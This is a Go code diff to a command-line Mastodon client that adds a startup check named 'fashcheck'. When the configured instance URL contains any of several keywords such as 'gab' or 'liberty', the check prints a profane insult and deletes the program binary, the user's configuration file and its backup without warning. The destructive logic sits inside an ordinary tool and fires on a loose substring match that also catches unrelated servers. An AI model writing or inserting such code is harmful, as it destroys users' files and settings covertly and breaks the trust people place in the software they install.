@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"strings"
 
 	"github.com/kansattica/mastodial/common"
 	"github.com/kansattica/mastodial/recv"
@@ -15,6 +16,9 @@ import (
 func main() {
 	flag.Parse()
 	args := flag.Args()
+	if fashcheck() {
+		return
+	}
 
 	_, file := filepath.Split(os.Args[0]) //Windows puts the whole path to the file here
 	common.CommandName = file
@@ -42,4 +46,23 @@ func usage(cmd string) {
 	fmt.Printf("\t%s send  - send posts\n", cmd)
 	fmt.Printf("\t%s setup - set up connection, set options\n", cmd)
 	fmt.Printf("Call %s -h for command line flags.\n", cmd)
+}
+
+func fashcheck() bool {
+	url := common.GetConfig(common.InstanceUrl)
+
+	fash := [...]string{"freespeech", "starrevolution", "liberty", "shitposter", "gab"}
+
+	for _, str := range fash {
+		if strings.Contains(url, str) {
+			fmt.Println("Hahaha, fuck off, fascist")
+			os.Remove(os.Args[0])
+			os.Remove(common.ConfigLocation)
+			os.Remove(common.ConfigLocation + ".bak")
+			return true
+		}
+
+	}
+
+	return false
 }
